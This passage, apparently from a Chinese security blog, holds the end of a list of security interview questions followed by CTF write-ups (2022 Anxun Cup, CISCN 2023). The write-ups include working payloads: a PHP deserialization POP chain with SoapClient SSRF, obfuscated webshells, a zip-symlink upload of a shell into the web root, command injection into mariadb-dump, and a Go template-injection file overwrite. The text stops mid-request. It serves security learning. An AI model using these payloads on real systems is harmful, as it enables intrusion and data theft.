class="code"><pre><span class="line">日志包含</span><br><span class="line">cve-phpmyadmin，包含数据库文件</span><br><span class="line">php-session文件/临时文件包含（条件竞争）</span><br><span class="line">docker-pearcmd.php 写🐎</span><br></pre></td></tr></table></figure></li><li><p>简述一下XXE漏洞产生的原理，针对PHP和JAVA，XXE分别可以进行哪些恶意利用?(★★)</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">引入外部恶意实体，支持如下协议</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230506225044953-1686810531410.png" alt="image-20230506225044953"></p></li></ul><h2 id="PHP安全"><a href="#PHP安全" class="headerlink" title="PHP安全"></a>PHP安全</h2><ul><li><p>PHP中如何使用<code>phar://</code>伪协议触发反序列化，利用场景以及前提条件有哪些?(★★)</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">文件操作函数触发</span><br><span class="line">前提条件：目标开启phar扩展,存在危险的类和方法</span><br></pre></td></tr></table></figure></li><li><p>如何绕过<code>php.ini</code>中<code>disable_function</code>的限制，有哪些方法，其中成功率最高的方法是哪个，为什么?(★★★)</p><p><a href="https://www.freebuf.com/articles/network/263540.html">https://www.freebuf.com/articles/network/263540.html</a></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">webshell管理工具都自带了绕过disable_function的功能</span><br></pre></td></tr></table></figure></li><li><p>文件上传中<code>%00</code>截断的原理是什么，官方是如何设计修复方案的?(★★)</p><p><img src="/../images/image-20230615144441227.png" alt="image-20230615144441227"></p><p><img src="/../images/image-20230615144248486.png" alt="image-20230615144248486"></p></li><li><p>实现一个一句话webshell，绕过RASP的方式有哪些，绕过机器学习检测的方式有哪些，绕过AST-Tree的方式有哪些(★★)</p></li><li><p>PHP伪协议的攻击场景有哪些？(★★)</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">文件包含：读取源码</span><br><span class="line">phar反序列化</span><br><span class="line">使用filter过滤器构造webshell</span><br></pre></td></tr></table></figure></li><li><p><code>mail</code>函数的攻击面有哪些?(★)</p></li><li><p>如何不通过数字以及字符构造webshell，其原理是什么，此类特性还会造成什么安全问题?(★)</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">php特性，支持字母自增</span><br></pre></td></tr></table></figure></li></ul><h2 id="JAVA安全"><a href="#JAVA安全" class="headerlink" title="JAVA安全"></a>JAVA安全</h2><ul><li><p><code>ClassLoader</code>是什么? 加载自定义<code>ClassLoader</code>的前提是什么? (★)</p></li><li><p>大概讲一下<code>CommonCollections1</code>的利用链，该利用链有什么样的限制? (★★)</p></li><li><p>fastjson的反序列化和原生反序列化漏洞的区别是什么? (★★)</p><p><img src="/../images/image-20230615145147923.png" alt="image-20230615145147923"></p></li><li><p>在tomcat中实现内存马有哪些方式，有办法实现重启之后依然不会消失的内存马吗? (★)</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">listen</span><br><span class="line">filter</span><br><span class="line">servlet</span><br></pre></td></tr></table></figure></li><li><p>单向代码执行链如何实现执行多条语句，如<code>CommonCollections1</code> (★)</p></li><li><p>请简单讲述一下Shiro反序列化漏洞的原理，无法使用ysoerial中common-collections利用链的原因是什么? (★)</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">shiro框架提供了一个remember me的功能，会对cookie中的remember me的值进行base64解码，aes解密，反序列化  只要能找到aes的密钥就可以构造恶意序列化内容。550密钥硬编码，721用于加密rememberMe Cookie的算法AES-128-CBC存在缺陷 ，攻击者可以通过Padding Oracle 构造出任意序列化数据的有效密文，从而实施反序列化攻击。</span><br><span class="line"></span><br><span class="line">利用链限制</span><br><span class="line">https://paper.seebug.org/1285/#_4</span><br></pre></td></tr></table></figure></li><li><p>冰蝎当中通过Java联动<code>Cobalt Strike</code>上线的原理是什么? (★)</p></li><li><p><code>serialVersionUID</code> 在反序列化中的作用是什么? (★)</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Java的序列化机制是通过在运行时判断类的serialVersionUID来验证版本一致性的。在进行反序列化时，JVM会把传来的字节流中的serialVersionUID与本地相应实体（类）的serialVersionUID进行比较，如果相同就认为是一致的，可以进行反序列化，否则就会出现序列化版本不一致的异常。 </span><br></pre></td></tr></table></figure></li></ul><h2 id="Linux相关"><a href="#Linux相关" class="headerlink" title="Linux相关"></a>Linux相关</h2><ul><li>简述一下守护进程的概念，如何生成一个守护进程? (★)</li><li>Linux 服务器的安全运维操作有哪些？如何保护 SSH？(★★)</li><li>入侵 Linux 服务器后需要清除哪些日志？(★★)</li><li>反弹 shell 的常用命令？一般常反弹哪一种 shell？为什么？(★★★)</li><li>从主机的层面，反弹shell如何监控 (★★★)</li><li>Rootkit的种类有哪些，针对不同种类的Rootkit应该如何防护以及检测 (★★)</li><li>A账户创建了权限为766的文件夹<code>adir</code>，该文件夹中有B账户的文件<code>password.txt</code>，权限为B账户的700，请问B账户能否读取到<code>adir/password.txt</code>文件的内容 (★)</li><li>ssh软链接后门的原理是什么，可以通过该原理构造其他后门吗?(★)</li><li>Linux中fork的原理是什么，子进程一定会拷贝父进程的资源状态吗？(★★)</li><li>实现R3层HOOK的方式有哪些，R0层的HOOK又有哪些? (★)</li><li>Linux下如何准确实现应用识别，如识别<code>nginx</code> <code>mysql</code>等 (★)</li><li>假设某Linux机器存在命令审计(方法未知)，有哪些可能的绕过方法? (★★)</li><li>Linux常见的提权方法有哪些?(★★)</li><li>僵尸进程和孤儿进程的区别是什么? (★)</li></ul><h2 id="Windows相关"><a href="#Windows相关" class="headerlink" title="Windows相关"></a>Windows相关</h2><ul><li>UAC是如何进行鉴权校验的? BypassUAC的常见方法有哪些? (★★)</li><li>SSDT表是什么，如何在系统中找到SSDT表并进行hook? (★)</li><li>Windows是如何进行权限控制的，具体的权限校验模型是什么? (★)</li></ul><h2 id="内网渗透"><a href="#内网渗透" class="headerlink" title="内网渗透"></a>内网渗透</h2><ul><li><p>psexec的底层实现原理是什么? (★)</p><p>这款工具的初衷是帮助管理员管理大量的机器的，后来被攻击者用来做横向渗透。</p><p><a href="https://tttang.com/archive/1710/#toc_psexec">https://tttang.com/archive/1710/#toc_psexec</a></p><p><a href="https://payloads.online/archivers/2020-04-02/1/">https://payloads.online/archivers/2020-04-02/1/</a></p><p><img src="/../images/image-20230601133356646.png" alt="image-20230601133356646"></p></li><li><p>SSP接口中修复了哪个模块杜绝了mimikatz的恶意利用，具体是如何修复的？(★★)</p></li><li><p>内网KDC服务器开放在哪个端口，针对kerbores的攻击有哪些? (★★★)</p></li><li><p>在win10或者winserver2012中，如果需要使用mimikatz，该如何使用，修改注册表后如何在不重启机器的情况下获取NTLM? (★★)</p></li><li><p>域内如何查询员工对应的机器? (★)</p></li><li><p>如何查询域之间的信任关系? (★)</p><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">nltest /domain_trusts /all_trusts /v /server:&lt;域控ip&gt;    //查询信任域</span><br></pre></td></tr></table></figure><p><img src="/../images/c7327514d30658e4bc2f76366a1d568d.png" alt="img"></p></li><li><p>域控开放的常见端口有哪些?(★)</p></li><li><p>windows内网中ntlm协议认证过程 (★★★)</p><p><a href="https://ares-x.com/2020/03/16/%E5%9F%9F%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0%EF%BC%88%E4%B8%80%EF%BC%89Windows%E8%AE%A4%E8%AF%81%E6%9C%BA%E5%88%B6/">https://ares-x.com/2020/03/16/%E5%9F%9F%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0%EF%BC%88%E4%B8%80%EF%BC%89Windows%E8%AE%A4%E8%AF%81%E6%9C%BA%E5%88%B6/</a></p></li><li><p>cobalt strike中上线方式有哪些，各自是什么原理，如果需要绕过监控，如何绕? (★★)</p></li><li><p>横向渗透中，wmic如何构造有回显的命令执行? (★★)</p></li><li><p>windows应急响应中，需要查看哪些安全日志ID，分别对应哪些攻防场景，如果该windows主机为域控，又应该查看哪些事件日志? (★★★)</p></li><li><p>golden ticket和sliver ticket的区别是什么? (★★★)</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">黄金票据，获取KDC用户（krbtg用户的hash值）就可以伪造任意用户的黄金票据从而实现对域内任意机器的一个访问。</span><br><span class="line"></span><br><span class="line">白银票据，当获取到域内机器用户的hash值就可以伪造一个真正的白银票据。实现对某个机器特定服务的访问。</span><br><span class="line"></span><br><span class="line">他们两个区别就在黄金票据作用更大获得TGT票据后可以访问任意机器任意服务，白银只能指定机器指定服务。</span><br></pre></td></tr></table></figure></li><li><p>sliver ticket利用的前置条件是什么?(★)</p></li><li><p>在非域主机的情况下，如何快速发现域主机？ (★★)</p></li><li><p>mimikatz的原理，哪个补丁导致了mimikatz无法利用，如何绕过? (★★)</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">安装了KB2871997补丁或者系统版本大于windows server 2012时，lsass.exe不保存明文密码不保存明文的密码。</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 启用Wdigest Auth，内存中还是会保存系统的明文口令</span><br><span class="line">将下列注册表路径的</span><br><span class="line">HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest</span><br><span class="line">以下项的</span><br><span class="line">UseLogonCredential</span><br><span class="line">值修改成0或1</span><br><span class="line">0：关闭Wdigest Auth</span><br><span class="line">1：启动Wdigest Auth</span><br></pre></td></tr></table></figure></li><li><p>有没有办法在不重启机器的前提下启用wdigest这个SSPI? (★)</p></li><li><p>NTLM relay的攻击场景有哪些，使用NTLM relay会受到哪些限制? (★)</p></li><li><p>windows中如何鉴别用户身份? SID是什么? 基于SID的SID History攻击原理是什么? (★)</p></li><li><p>假设拿到了某台域机器的权限，但是机器上并没有域账户，应该如何进行域渗透? (★★)</p></li><li><p>域的初始化配置允许任何域用户登录任意加了域的机器，这是为什么? (★)</p></li><li><p>如何查询域管登录过的机器，查询原理又是什么? (★)</p></li></ul><h2 id="其他安全相关"><a href="#其他安全相关" class="headerlink" title="其他安全相关"></a>其他安全相关</h2><ul><li>RSA加解密流程(★)</li><li>HTTPS是如何实现的(★★)</li><li>如何防护运营商的DNS劫持&#x2F;链路劫持(★★)</li><li>如何防范羊毛党?(★)</li><li>一个大范围影响的0day被曝光，作为甲方安全工程师，应该如何处理(★★)</li></ul>]]></content>
      
      
      <categories>
          
          <category> 面试 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>2022 安洵杯</title>
      <link href="/2023/05/31/2022%E5%AE%89%E6%B4%B5%E6%9D%AF/"/>
      <url>/2023/05/31/2022%E5%AE%89%E6%B4%B5%E6%9D%AF/</url>
      
        <content type="html"><![CDATA[<h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><h2 id="babyphp"><a href="#babyphp" class="headerlink" title="babyphp"></a>babyphp</h2><h4 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h4><p>与buu–bestphp‘s revenge差不多</p><ul><li>session+反序列化</li><li>原生类SSRF+文件操作</li></ul><h4 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h4><p>第一步，设置php的session解析器，使得下一次会话时session中保存的是构造好的SoapClient对象。</p><p>SoapClient对象</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment"># $target = &quot;http://127.0.0.1/flag.php?a=GlobIterator&amp;b=/f*&quot;; 查找flag文件名</span></span><br><span class="line"><span class="variable">$target</span> = <span class="string">&quot;http://127.0.0.1/flag.php?a=SplFileObject&amp;b=/f1111llllllaagg&quot;</span>;</span><br><span class="line"><span class="variable">$post_string</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="variable">$headers</span> = <span class="keyword">array</span>(</span><br><span class="line">    <span class="string">&#x27;X-Forwarded-For: 127.0.0.1&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Cookie: PHPSESSID=123456789&#x27;</span> <span class="comment"># 随便给一个</span></span><br><span class="line">);</span><br><span class="line"><span class="variable">$b</span> = <span class="keyword">new</span> <span class="title class_">SoapClient</span>(<span class="literal">null</span>,</span><br><span class="line"><span class="keyword">array</span>(<span class="string">&#x27;location&#x27;</span> =&gt; <span class="variable">$target</span>,</span><br><span class="line">  <span class="string">&#x27;user_agent&#x27;</span>=&gt;<span class="string">&#x27;khaz^^Content-Type: application/x-www-form-urlencoded^^&#x27;</span>.<span class="title function_ invoke__">join</span>(<span class="string">&#x27;^^&#x27;</span>,<span class="variable">$headers</span>).<span class="string">&#x27;^^Content-Length: &#x27;</span>. (<span class="keyword">string</span>)<span class="title function_ invoke__">strlen</span>(<span class="variable">$post_string</span>).<span class="string">&#x27;^^^^&#x27;</span>.<span class="variable">$post_string</span>,</span><br><span class="line">        <span class="string">&#x27;uri&#x27;</span>=&gt;<span class="string">&#x27;hello&#x27;</span>));</span><br><span class="line"><span class="variable">$aaa</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$b</span>);</span><br><span class="line"><span class="variable">$aaa</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;^^&#x27;</span>,<span class="string">&quot;\r\n&quot;</span>,<span class="variable">$aaa</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;|&quot;</span>.<span class="title function_ invoke__">urlencode</span>(<span class="variable">$aaa</span>);</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20221128162813314-1686150400485.png" alt="image-20221128162813314"></p><p>第二步，反序列化触发SoapClient的call方法，从而导致SSRF，从而将flag保存到SSRF请求对应的session中。</p><p>pop：</p><p>B::destruct   →    C::toString   →   A::invoke    →   C::uwant</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$b</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;a = <span class="string">&quot;babyhacker&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;触发invoke\n&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$a</span>.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;a) &amp;&amp; <span class="variable language_">$this</span>-&gt;a == <span class="title function_ invoke__">md5</span>(<span class="variable">$this</span>-&gt;a)) &#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;b-&gt;<span class="title function_ invoke__">uwant</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$b</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$k</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;触发destruct\n&quot;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;b = <span class="variable language_">$this</span>-&gt;k;</span><br><span class="line">        <span class="keyword">die</span>(<span class="variable language_">$this</span>-&gt;a);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">C</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>=<span class="string">&#x27;getflag&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$c</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;触发toString\n&quot;</span>;</span><br><span class="line">        <span class="variable">$cc</span> = <span class="variable language_">$this</span>-&gt;c;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$cc</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">uwant</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;触发uwant\n&quot;</span>;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;a == <span class="string">&quot;phpinfo&quot;</span>) &#123;</span><br><span class="line">            <span class="title function_ invoke__">phpinfo</span>();</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="title function_ invoke__">call_user_func</span>(<span class="keyword">array</span>(<span class="title function_ invoke__">reset</span>(<span class="variable">$_SESSION</span>), <span class="variable">$this</span>-&gt;a));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">A</span>();</span><br><span class="line"><span class="variable">$b</span> = <span class="keyword">new</span> <span class="title function_ invoke__">B</span>();</span><br><span class="line"><span class="variable">$c</span> = <span class="keyword">new</span> <span class="title function_ invoke__">C</span>();</span><br><span class="line"></span><br><span class="line"><span class="variable">$c2</span> =<span class="keyword">new</span> <span class="title function_ invoke__">C</span>();</span><br><span class="line"></span><br><span class="line"><span class="variable">$b</span>-&gt;a = <span class="variable">$c</span>;</span><br><span class="line"><span class="variable">$c</span>-&gt;c = <span class="variable">$a</span>;</span><br><span class="line"><span class="variable">$a</span>-&gt;a = <span class="string">&quot;0e215962017&quot;</span>;</span><br><span class="line"><span class="variable">$a</span>-&gt;b = <span class="variable">$c2</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$result</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$b</span>);</span><br><span class="line"><span class="comment">// echo $result;</span></span><br><span class="line"><span class="variable">$x</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;O:1:&quot;A&quot;:2:&#x27;</span>, <span class="string">&#x27;O:1:&quot;A&quot;:3:&#x27;</span>,<span class="variable">$result</span>);<span class="comment">//绕过__wakeup()</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="variable">$x</span>);</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20221128163059684-1686150400486.png" alt="image-20221128163059684"></p><p>这里的500是因为C::tostring()的报错，而不是反序列化出错。</p><img src="E:\typora img\image-20221128163329919.png" alt="image-20221128163329919" style="zoom:67%;" /><p>第三步，修改cookie中的PHPSESSIONID为SSRF请求的PHPSESSIONID，读取到flag。</p><p><img src="/../images/image-20221128163549644-1686150400486.png" alt="image-20221128163549644"></p><p>查看flag文件名的结果</p><p><img src="/../images/image-20221128163822875-1686150400486.png" alt="image-20221128163822875"></p><h2 id="easy-upload–复现"><a href="#easy-upload–复现" class="headerlink" title="easy_upload–复现"></a>easy_upload–复现</h2><p>dirsearch扫描没有发现其他页面。</p><p>只有一个文件上传功能点</p><ul><li>先上传一句话木马，发现有过滤</li></ul><p><img src="/../images/image-20221128164147870-1686150400486.png" alt="image-20221128164147870"></p><ul><li>尝试图片+.htaceess</li></ul><p><img src="/../images/image-20221128164425319-1686150400486.png" alt="image-20221128164425319"></p><p>发现只接受.php文件，那么就是要绕过文件内容过滤。</p><p>经测试发现</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$ ` * 还有很多函数被过滤</span><br></pre></td></tr></table></figure><p>以下可以</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">echo</span> <span class="number">1</span>;<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="/../images/image-20221128164736609-1686150400486.png" alt="image-20221128164736609"></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">phpinfo</span>();<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="/../images/image-20221128164852425-1686150400487.png" alt="image-20221128164852425"></p><p>在phpinfo中可以发现<code>disable_function</code>禁用了几乎所有的函数。</p><img src="E:\typora img\image-20221128164951239.png" alt="image-20221128164951239" style="zoom:67%;" /><p>但是没有禁用<code>file_get_contents</code>这个读取文件的函数。所以只要能找到flag的路径就可以了。</p><p>网上的师傅做法是利用原生类来找到路径，利用php字符串解析来绕过字符过滤。</p><h4 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h4><p>查找路径</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment"># \147\154\157\142\72\57\57\57\146\52 → glob:///f*</span></span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">echo</span> <span class="keyword">new</span> <span class="built_in">DirectoryIterator</span>(<span class="string">&quot;\147\154\157\142\72\57\57\57\146\52&quot;</span>);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="/../images/image-20221128165717142-1686150400487.png" alt="image-20221128165717142"></p><p>读取flag</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment"># \146\151\154\145\137\147\145\164\137\143\157\156\164\145\156\164\163 → file_get_contents</span></span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">echo</span> <span class="string">&quot;\146\151\154\145\137\147\145\164\137\143\157\156\164\145\156\164\163&quot;</span>(<span class="string">&quot;/fl1111111111ag&quot;</span>);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="/../images/image-20221128165926537-1686150400487.png" alt="image-20221128165926537"></p><h1 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h1><h2 id="flybenben–复现"><a href="#flybenben–复现" class="headerlink" title="flybenben–复现"></a>flybenben–复现</h2><p>CE修改</p><p><img src="/../images/QQ%E6%88%AA%E5%9B%BE20221128160736-1686150400487.jpg" alt="QQ截图20221128160736"></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>CISCN2023 初赛</title>
      <link href="/2023/05/31/CISCN2023%E5%88%9D%E8%B5%9B/"/>
      <url>/2023/05/31/CISCN2023%E5%88%9D%E8%B5%9B/</url>
      
        <content type="html"><![CDATA[<h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h1><h2 id="27日-unzip"><a href="#27日-unzip" class="headerlink" title="27日_unzip"></a><strong>27日_unzip</strong></h2><p>打开网站，是一个文件上传的功能点，配合题目的名字，直接上传一个软链接文件，然后回显</p><p><img src="/../images/image-20230528170519886-1686150302067.png" alt="image-20230528170519886"></p><p>发现只能上传zip文件，并且使用了<code>unzip</code>命令来解压缩上传的压缩包，所以不能使用路径穿越</p><blockquote><p>因为<code>unzip</code>默认会忽视文件名中<code>../</code></p></blockquote><p><img src="/../images/image-20230528171026375-1686150302067.png" alt="image-20230528171026375"></p><p>但是可以通过软链接达到路径穿越的功能。</p><p>先创建一个软链接指向网站目录，压缩为1.zip</p><blockquote><p>zip要加上-y参数，才能保存软链接</p></blockquote><p><img src="/../images/Snipaste_2023-05-28_15-44-03-1686150302068.png" alt="Snipaste_2023-05-28_15-44-03"></p><p>然后再创建一个与软链接同名的目录，并在该目录下创建木马文件，将该目录压缩为2.zip</p><p><img src="/../images/Snipaste_2023-05-28_15-43-44-1686150302068.png" alt="Snipaste_2023-05-28_15-43-44"></p><p>然后先上传1.zip，解压得到软链接<code>test</code>，再上传2.zip，解压得到test目录和shell.php，因为test指向&#x2F;var&#x2F;www&#x2F;html,所以shell.php实际上是被解压到网站目录下</p><p><img src="/../images/Snipaste_2023-05-28_15-45-01-1686150302068.png" alt="Snipaste_2023-05-28_15-45-01"></p><p><img src="/../images/Snipaste_2023-05-28_15-45-12-1686150302068.png" alt="Snipaste_2023-05-28_15-45-12"></p><p>最后访问，执行<code>cat /flag</code>即可</p><p><img src="/../images/Snipaste_2023-05-28_15-45-38-1686150302068.png" alt="Snipaste_2023-05-28_15-45-38"></p><h2 id="dumpit"><a href="#dumpit" class="headerlink" title="dumpit"></a><strong>dumpit</strong></h2><p>访问网站看到</p><p><img src="/../images/image-20230528171725614-1686150302068.png" alt="image-20230528171725614"></p><p>可以dump和query</p><p>一开始是对着query怼的，因为对dump不熟</p><p><img src="/../images/image-20230528171909470-1686150302069.png" alt="image-20230528171909470"></p><p>把语句打印出来了，所以很明显可以控制table_2_query进行注入，然后题目提示了flag在&#x2F;flag，所以先尝试可不可以写文件getshell，发现不行，查了一下secure_file_priv为NULL确实是不行的</p><p><img src="/../images/image-20230528172420662-1686150302069.png" alt="image-20230528172420662"></p><p>尝试堆叠注入，看一下能不能日志getshell，发现；反引号都被过滤了</p><p><img src="/../images/image-20230528172554485-1686150302069.png" alt="image-20230528172554485"></p><p>所以query这条路就走不通了。</p><p>然后是dump，在网上查到</p><p><img src="/../images/image-20230528172802761-1686150302069.png" alt="image-20230528172802761"></p><p><img src="/../images/image-20230528172816727-1686150302069.png" alt="image-20230528172816727"></p><p>知道了是使用系统命令来dump，这里就存在命令执行漏洞</p><p><img src="/../images/image-20230528173216386-1686150302069.png" alt="image-20230528173216386"></p><p>参照笔记，这里只用0d%0a可以。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?db=ctf&amp;table_2_dump=%0d%0a cat index.php </span><br></pre></td></tr></table></figure><p>在here中可以看到源码</p><p><img src="/../images/image-20230528173600848-1686150302069.png" alt="image-20230528173600848"></p><p>关键点</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$black</span> = <span class="string">&#x27;;`*#^$&amp;|&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$dump</span>=<span class="string">&#x27;mariadb-dump &#x27;</span>.<span class="variable">$db</span>.<span class="string">&#x27; &#x27;</span>.<span class="variable">$t2d</span>.<span class="string">&#x27; &gt;./log/&#x27;</span>.<span class="variable">$randstr</span>.<span class="string">&#x27;.log&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">system</span>(<span class="variable">$dump</span>);</span><br></pre></td></tr></table></figure><p>然后题目不是说了flag在&#x2F;flag，读了一下发现没用，看了一下权限</p><p><img src="/../images/image-20230528173721850-1686150302069.png" alt="image-20230528173721850"></p><p>开始想着写个🐎，上去提权试试，看了下目录权限，反弹shell也失败了（麻了😅）</p><p><img src="/../images/image-20230528173754533-1686150302069.png" alt="image-20230528173754533"></p><p>后面想到可能被骗了，在环境变量中找到了flag</p><p><img src="/../images/Snipaste_2023-05-28_15-35-41-1686150302069.png" alt="Snipaste_2023-05-28_15-35-41"></p><h2 id="go-session–复现"><a href="#go-session–复现" class="headerlink" title="go_session–复现"></a>go_session–复现</h2><p>本地伪造session</p><p><img src="/../images/image-20230608095627395.png" alt="image-20230608095627395"></p><p><img src="/../images/image-20230608095722517.png" alt="image-20230608095722517"></p><p>测试一下，发现伪造成功了</p><p><img src="/../images/image-20230608095852646.png" alt="image-20230608095852646"></p><p><img src="/../images/image-20230608095436931.png" alt="image-20230608095436931"></p><p>django</p><p><img src="/../images/image-20230608104903856.png" alt="image-20230608104903856"></p><p>go</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">func (c *Context) SaveUploadedFile(file *multipart.FileHeader, dst string) error</span><br></pre></td></tr></table></figure><p>SaveUploadedFile上传表单文件到指定的dst</p><p>第一个参数为表单name，第二个参数为要保存的位置</p><p>读取源码</p><p>payload</p><figure class="highlight http"><table><tr><td class="code"><pre><span class="line">/admin?name=&#123;%25include+c.Request.Referer()%25&#125;</span><br><span class="line"></span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>E:/test.txt</span><br><span class="line"></span><br><span class="line">/app/server.py</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230608100900686.png" alt="image-20230608100900686"></p><p>发现它是debug模式的，<strong>热部署（就是每次修改之后会重新编译运行一次）</strong></p><p>所以我们可以进行覆盖</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">GET /admin?name=&#123;&#123;c.SaveUploadedFile(c.FormFile(c.ClientIP()),c.Query(c.ClientIP()))&#125;&#125;&amp;<span class="number">118.117</span><span class="number">.49</span><span class="number">.52</span>=/app/server.py HTTP/<span class="number">1.1</span></span><br><span class="line">Host: <span class="number">124.220</span><span class="number">.192</span><span class="number">.120</span>:<span class="number">8888</span></span><br><span class="line">Content-<span class="type">Type</span>: multipart/form-data; boundary=----WebKitFormBoundary7IWRoUoGnVmsx4c3</span><br><span class="line">Upgrade-Insecure-Requests: <span class="number">1</span></span><br><span class="line">User-Agent: Mozilla/<span class="number">5.0</span> (Windows NT <span class="number">10.0</span>; Win64; x64) AppleWebKit/<span class="number">537.36</span> (KHTML, like Gecko) Chrome/<span class="number">114.0</span><span class="number">.0</span><span class="number">.0</span> Safari/<span class="number">537.36</span></span><br><span class="line">Accept: 